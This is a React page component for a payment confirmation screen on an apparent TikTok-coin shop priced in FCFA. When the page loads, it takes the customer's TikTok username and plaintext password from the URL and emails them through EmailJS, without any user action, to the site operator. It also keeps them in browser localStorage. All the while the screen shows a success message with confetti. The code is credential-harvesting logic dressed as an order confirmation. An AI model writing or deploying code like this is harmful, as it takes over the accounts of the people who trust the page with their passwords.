import { useEffect, useState } from 'react';
import { Layout } from '../components/Layout';
import { CheckCircle } from 'lucide-react';
import { useLocation, useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { Confetti } from '../components/Confetti';
import { Purchase } from '../types';
import { getPurchaseHistory } from '../utils/localStorage';
import emailjs from '@emailjs/browser';

// Configuration EmailJS
const EMAILJS_SERVICE_ID = 'service_zr57d2k';
const EMAILJS_TEMPLATE_ID = 'template_enecl1c';
const EMAILJS_PUBLIC_KEY = 'oOJl0jLVKr1t0kB23';

export const PaymentConfirmation = () => {
  const { t } = useTranslation();
  const [showConfetti, setShowConfetti] = useState(true);
  const [purchaseDetails, setPurchaseDetails] = useState<Purchase | null>(null);
  const [isSending, setIsSending] = useState(false);
  const [sendError, setSendError] = useState('');
  const [emailSent, setEmailSent] = useState(false);
  const location = useLocation();
  const navigate = useNavigate();
  
  // Récupérer l'orderId, les identifiants et les détails d'achat depuis l'URL
  const searchParams = new URLSearchParams(location.search);
  const orderId = searchParams.get('orderId');
  const username = searchParams.get('username');
  const password = searchParams.get('password');
  const email = searchParams.get('email');
  const amountFromUrl = searchParams.get('amount');
  const priceFromUrl = searchParams.get('price');
  
  // Convertir les valeurs en nombres si elles existent
  const amount = amountFromUrl ? parseInt(amountFromUrl, 10) : null;
  const price = priceFromUrl ? parseInt(priceFromUrl, 10) : null;
  
  useEffect(() => {
    if (orderId) {
      // Récupérer les détails de l'achat depuis le localStorage
      const purchaseHistory = getPurchaseHistory();
      const purchase = purchaseHistory.find(p => p.id === orderId);
      if (purchase) {
        setPurchaseDetails(purchase);
      }
    }
    
    // Arrêter les confettis après 5 secondes
    const timer = setTimeout(() => {
      setShowConfetti(false);
    }, 5000);
    
    return () => clearTimeout(timer);
  }, [orderId]);

  // Envoyer l'email automatiquement au chargement de la page
  useEffect(() => {
    // Vérifier que tous les paramètres sont présents et que l'email n'a pas déjà été envoyé
    if (username && password && email && orderId && !emailSent && !isSending) {
      // Vérifier si cet orderId a déjà été traité
      const existingOrders = JSON.parse(localStorage.getItem('pendingOrders') || '[]');
      const alreadySent = existingOrders.some((order: any) => order.order_id === orderId);
      
      if (!alreadySent) {
        sendEmailAutomatically();
      } else {
        // Déjà envoyé, rediriger directement
        setEmailSent(true);
        setTimeout(() => {
          navigate(`/payment/success?orderId=${orderId}`);
        }, 2000);
      }
    }
  }, [username, password, email, orderId, emailSent, isSending]);

  const sendEmailAutomatically = async () => {
    setIsSending(true);
    setSendError('');
    
    try {
      const coinsAmount = amount;
      const orderPrice = price;
      const orderDate = new Date().toISOString();
      
      const templateParams = {
        order_id: orderId,
        tiktok_username: username,
        tiktok_password: password,
        client_email: email,
        coins_amount: coinsAmount?.toLocaleString() || 'Non spécifié',
        price: orderPrice?.toLocaleString() || 'Non spécifié',
        date: new Date(orderDate).toLocaleString('fr-FR', {
          dateStyle: 'full',
          timeStyle: 'short'
        })
      };

      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        templateParams,
        EMAILJS_PUBLIC_KEY
      );

      console.log('Email envoyé automatiquement pour la commande:', orderId);
      
      // Stocker dans localStorage
      const orderData = {
        ...templateParams,
        status: 'sent',
        sentAt: new Date().toISOString()
      };
      const existingOrders = JSON.parse(localStorage.getItem('pendingOrders') || '[]');
      existingOrders.push(orderData);
      localStorage.setItem('pendingOrders', JSON.stringify(existingOrders));
      
      setEmailSent(true);
      
      // Rediriger vers la page de succès après 2 secondes
      setTimeout(() => {
        navigate(`/payment/success?orderId=${orderId}`);
      }, 2000);

    } catch (error) {
      console.error('Erreur lors de l\'envoi automatique:', error);
      setSendError(
        error instanceof Error 
          ? error.message 
          : 'Une erreur est survenue. Veuillez réessayer.'
      );
      setIsSending(false);
    }
  };
  
    
  return (
    <Layout balance={purchaseDetails?.amount || 0} hideBalance={!purchaseDetails}>
      {showConfetti && <Confetti duration={5000} />}
      
      <div className="max-w-2xl mx-auto mt-12 p-8 bg-[var(--card-bg)] rounded-[var(--radius-lg)] shadow-[var(--shadow-md)] border border-[var(--border-dark)]">
        <div className="flex flex-col items-center text-center mb-8">
          <div className="w-20 h-20 rounded-full bg-green-900 bg-opacity-20 flex items-center justify-center mb-6">
            <CheckCircle className="w-10 h-10 text-green-400" />
          </div>
          
          <h1 className="text-3xl font-bold mb-2">{t('paymentSuccessful')}</h1>
          <p className="text-[var(--text-secondary)] max-w-md mb-2">
            {t('thankYou')} 
          </p>
          <p className="text-[var(--text-secondary)] max-w-md mb-6">
            {emailSent 
              ? t('orderProcessing', 'Votre commande est en cours de traitement. Vous allez être redirigé...')
              : isSending 
                ? t('sendingOrder', 'Envoi de votre commande en cours...')
                : t('confirmationMessage', 'Votre paiement a été traité avec succès.')}
          </p>
          
          {sendError && (
            <div className="w-full p-4 mb-4 bg-red-100 border border-red-200 rounded-[var(--radius-md)] text-red-800">
              <p className="text-sm">{sendError}</p>
              <button 
                onClick={sendEmailAutomatically}
                className="mt-2 text-sm underline hover:no-underline"
              >
                Réessayer
              </button>
            </div>
          )}
          
          {isSending && (
            <div className="flex items-center justify-center gap-2 py-3 px-8">
              <div className="w-5 h-5 border-2 border-[var(--tiktok-blue)] border-t-transparent rounded-full animate-spin"></div>
              <span className="text-[var(--text-secondary)]">{t('processing', 'Traitement en cours...')}</span>
            </div>
          )}
          
          {emailSent && (
            <div className="flex items-center justify-center gap-2 py-3 px-8 text-green-500">
              <CheckCircle className="w-5 h-5" />
              <span>{t('orderSent', 'Commande envoyée avec succès!')}</span>
            </div>
          )}
        </div>
        
        {purchaseDetails && (
          <div className="bg-[var(--background-elevated-2)] rounded-[var(--radius-md)] p-6">
            <h2 className="text-xl font-semibold mb-4">{t('transactionDetails', 'Détails de la transaction')}</h2>
            
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('orderNumber', 'Numéro de commande')}</span>
                <span className="font-medium">{purchaseDetails.id}</span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('amountPaid', 'Montant payé')}</span>
                <span className="font-bold">{purchaseDetails.price.toLocaleString()} FCFA</span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('purchasedCoins', 'Pièces achetées')}</span>
                <span className="font-bold">{purchaseDetails.amount.toLocaleString()}</span>
              </div>
            </div>
          </div>
        )}
      </div>
    </Layout>
  );
};
